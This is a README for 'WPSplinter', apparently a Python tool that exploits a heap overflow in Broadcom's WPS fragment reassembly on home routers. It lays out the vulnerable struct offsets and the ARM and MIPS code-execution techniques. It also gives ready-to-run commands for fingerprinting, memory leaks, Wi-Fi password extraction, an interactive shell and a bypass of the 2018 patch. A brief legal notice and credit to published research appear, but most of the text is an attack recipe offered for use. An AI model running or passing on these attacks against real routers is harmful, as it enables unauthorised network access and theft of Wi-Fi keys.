# WPSplinter - Broadcom WPS Monitor Exploit

**WPSplinter** is a complete exploit for the Broadcom legacy WPS Monitor vulnerability, discovered and documented by [Quentin Kaiser](https://quentinkaiser.be/). This implementation is verified against the public ASUS RT-N66U Merlin firmware source code.

## Table of Contents

- [Overview](#overview)
- [Vulnerability Details](#vulnerability-details)
- [Installation](#installation)
- [Usage](#usage)
- [Exploit Phases](#exploit-phases)
- [Architecture Support](#architecture-support)
- [Outstanding Work Items](#outstanding-work-items)
- [References](#references)
- [Legal Notice](#legal-notice)
- [License](#license)

## Overview

WPSplinter exploits a heap buffer overflow in Broadcom's WPS (Wi-Fi Protected Setup) EAP fragment reassembly implementation. The vulnerability allows remote attackers within Wi-Fi range to achieve:

- **Memory disclosure** via controlled read primitives
- **Remote code execution** on ARM and MIPS architectures
- **Network key extraction** without authentication

### Key Features

- ✅ Firmware-verified against ASUS RT-N66U Merlin (2011)
- ✅ Supports ARM (BCM5354) and MIPS (RT2880) architectures
- ✅ 8 exploit phases from fingerprinting to shell
- ✅ 2018 patch bypass support
- ✅ Memory leak primitive for information disclosure

## Vulnerability Details

### Technical Summary

| Property | Value |
|----------|-------|
| **Buffer** | `frags_received[2048]` |
| **Overflow Size** | ~63KB (LF field = 0xFFFF) |
| **Trigger** | WPS fragment reassembly |
| **Affected** | Broadcom eCos & Linux WPS implementations |
| **Source** | `ap_eap_sm.c` ($Id: 279189 2011-08-23) |

### State Struct Layout

The vulnerability stems from the `EAP_WPS_AP_STATE` structure:

```c
typedef struct {
    char frags_received[2048];      // +0    : WPS data buffer
    int total_bytes_to_recv;        // +2048 : Attacker-controlled
    int total_received;             // +2052 : Write cursor
    char *next_frag_to_send;        // +2056 : Read primitive
    int frag_size;                  // +2060 : Leak length control
    // ... more fields ...
    char *last_sent;                // +2080 : Pointer (MIPS exploit)
    // ... more fields ...
    unsigned int (*send_data)(char *, uint32);  // +2108 : Function pointer (ARM)
} EAP_WPS_AP_STATE;
```

### Exploit Mechanics

#### ARM (send_data overwrite)
1. Overflow `frags_received[2048]` with crafted payload
2. Overwrite `send_data` function pointer with `system@PLT`
3. Embed command in MAC prefix: `[our_MAC][AP_MAC][padding][cmd;#]`
4. FRAG-ACK triggers `send_data()` → `system(cmd)`

#### MIPS (last_sent overwrite)
1. Stage command string in overflow region
2. Overwrite `last_sent` pointer to point at command
3. Wait 5 seconds for timer expiry
4. `ap_eap_sm_resend_last_sent()` calls `send_data(last_sent)`

## Installation

### Requirements

- Python 3.7+
- Scapy (`pip install scapy`)
- Root privileges for packet injection
- WiFi card supporting monitor mode

### Quick Install

```bash
# Clone repository
git clone https://github.com/DensenDeluxe/tinkering
cd wpsplinter

# Install dependencies
pip install scapy

# Verify installation
python3 wpsplinter.py --help
```

## Usage

### Basic Syntax

```bash
python3 wpsplinter.py --iface <interface> --bssid <AP_MAC> --ssid <network> --phase <phase> [options]
```

### Example Commands

#### 1. Fingerprint Target

Detect if the target AP is vulnerable:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase fingerprint
```

#### 2. ARM Exploit

Remote code execution on ARM targets:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase exploit_arm \
    --arch arm \
    --system_plt 0x27683 \
    --cmd "/bin/sh -i"
```

#### 3. MIPS Exploit

Remote code execution on MIPS targets:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase exploit_mips \
    --arch mips \
    --printf_got 0x27683 \
    --libc_printf_off 0x551d0 \
    --libc_system_off 0x14390 \
    --cmd "id;#"
```

#### 4. Extract WiFi PSK (Quick)

Extract PSK from a specific memory offset:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase extract_psk \
    --psk_offset 0x2000 \
    --psk_scan_size 8192
```

**Output example:**
```
============================================================
WiFi PSK CANDIDATES FOUND:
============================================================
[1] MySuperSecretPassword123 <-- MOST LIKELY
[2] wpa_passphrase
[3] pre_shared_key
============================================================

SSID: MyNetwork
Test with: wpa_passphrase <SSID> <PSK>
============================================================
```

#### 5. Smart PSK Extraction

Automatic multi-strategy PSK extraction:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase smart_psk
```

This will:
1. Scan common memory regions (0x1000-0x5000)
2. Perform stepped scan across first 64KB
3. Display all unique PSK candidates found

#### 6. Memory Leak

Read raw process memory:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase leak \
    --arch arm
```

#### 5. Bypass 2018 Patch

For patched firmware versions:

```bash
sudo python3 wpsplinter.py \
    --iface wlan0 \
    --bssid AA:BB:CC:DD:EE:FF \
    --ssid "MyNetwork" \
    --phase bypass
```

## Exploit Phases

| Phase | Description | Target |
|-------|-------------|--------|
| `fingerprint` | Detect vulnerability | All |
| `calibrate` | Measure FRAG-ACK timing | All |
| `leak` | Memory read primitive | All |
| **`extract_psk`** | **Extract WiFi PSK from memory** | **All** |
| **`smart_psk`** | **Smart PSK extraction (multi-strategy)** | **All** |
| `exploit_arm` | ARM RCE via send_data | ARM |
| `exploit_mips` | MIPS RCE via GOT overwrite | MIPS |
| `bypass` | Bypass 2018 patch | Patched |
| `shell` | Interactive shell | All |
| `verify` | Verify exploit success | All |

## Architecture Support

### ARM (Broadcom BCM5354)

- **Exploit Path**: `send_data` function pointer overwrite
- **Required**: `system@PLT` address
- **Command Format**: MAC prefix + `#` comment trick

### MIPS (Ralink RT2880)

- **Exploit Path**: `last_sent` pointer overwrite
- **Required**: GOT entry + libc offsets
- **Trigger**: 5-second timer in `ap_eap_sm_check_timer()`

## Outstanding Work Items

### A. Missing Constants (7 items)

Target-specific values that must be confirmed per firmware:

| # | Item | Source |
|:--:|------|--------|
| 01 | Exact `EAP_WPS_AP_STATE` struct layout | `ap_eap_sm.h`, Ghidra analysis |
| 02 | `WPS_EAP_DATA_MAX_LENGTH` | `wps_stateap.h` / `wps_api.h` |
| 03 | `EAP_WPS_FLAGS_LF` / `EAP_WPS_FLAGS_MF` | WPS headers |
| 04 | `WPS_FRAG_ACK` opcode | `wps_common.h` / `eap_wsc.h` |
| 05 | `EAP_WPS_FRAG_MAX` | WPS headers |
| 06 | `system@PLT` address (ARM) | Ghidra PLT analysis |
| 07 | `printf` GOT entry and libc offsets (MIPS) | Ghidra, libc analysis |

### B. Lab Validation (6 items)

Testing against owned/authorized devices:

| # | Task | Notes |
|:--:|------|-------|
| 08 | Run `phase_calibrate` and refine deltas | Confirm `OFF_NEXT_FRAG` offset |
| 09 | Verify filler arithmetic in `phase_bypass_2018patch` | `total_received` must = 2048 |
| 10 | Verify first-FRAG_ACK special case | `ap_eap_sm_sta_retrans` behavior |
| 11 | Confirm MAC-prefix command trick survives timer resends | `last_sent` reference stability |
| 12 | Test `wl actframe` shell-channel decoding | Slide 93 payload format |
| 13 | RF reliability soak test | Attenuated link validation |

### C. Housekeeping (5 items)

Project maintenance tasks:

| # | Task | Notes |
|:--:|------|-------|
| 14 | Deduplicate `phase_fingerprint` | Remove duplicate probe |
| 15 | Sanitize output PCAPs | Pseudonymize BSSID, SSID, etc. |
| 16 | Document legal boundaries | German StGB §§ 202a ff. |
| 17 | Upstream contribution — Wifit3 PR | Detection-only functionality |
| 18 | Preserve original sources | Attribution to Kaiser's research |

**Progress**: See [OUTSTANDING.md](OUTSTANDING.md) for detailed tracking.


## Firmware Analysis

This exploit has been verified against the ASUS RT-N66U Merlin firmware source code:

| Source File | $Id | Date |
|-------------|-----|------|
| `ap_eap_sm.c` | 279189 | 2011-08-23 |
| `ap_eap_sm.h` | 268017 | 2011-06-21 |
| `eapd.c` | 241391 | 2011-02-18 |

**Verified struct offsets** calculated from source with proper ARM 32-bit alignment.
See [FIRMWARE_ANALYSIS.md](FIRMWARE_ANALYSIS.md) for complete analysis.

## References

### Primary Sources

1. **Quentin Kaiser** - "One Parser, Two Bugs, Many Routers"
   - Blog: https://quentinkaiser.be/security/2026/10/16/one-parser-two-bugs/
   - Hexacon 2026 Presentation: https://quentinkaiser.be/assets/qkaiser-broadcom-wps-hexacon-2026.pdf
   - GitHub: https://github.com/qkaiser/broadcom-wps

2. **Firmware Sources** (ASUS RT-N66U Merlin)
   - `ap_eap_sm.c` ($Id: ap_eap_sm.c 279189 2011-08-23 10:14:21Z kenlo $)
   - `eapd.c` ($Id: eapd.c 241391 2011-02-18 03:35:48Z stakita $)
   - `ap_eap_sm.h` ($Id: ap_eap_sm.h 268017 2011-06-21 09:48:46Z kenlo $)

### Related Research

- WPS Protocol Specification (Wi-Fi Alliance)
- EAP Framework (RFC 3748)
- Broadcom WPS Implementation Analysis

## Legal Notice

### Testing Guidelines

Use **ONLY** against devices you own or are explicitly authorized to test.

### Disclaimer

This tool is provided "as is" without warranty. Use at your own risk. Memory corruption during exploitation may cause device crashes or require resets.

## License

MIT License - See [LICENSE](LICENSE) for details.

### Attribution

This implementation is based on research by Quentin Kaiser. When using or distributing this code, please attribute the original research:

> Based on "One Parser, Two Bugs, Many Routers" by Quentin Kaiser (2026).  
> https://github.com/qkaiser/broadcom-wps

## Contributing

Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Areas Needing Help

- ✅ Additional firmware testing
- ✅ Architecture-specific optimizations
- ✅ Documentation improvements
- ✅ Upstream integration with Wifit3


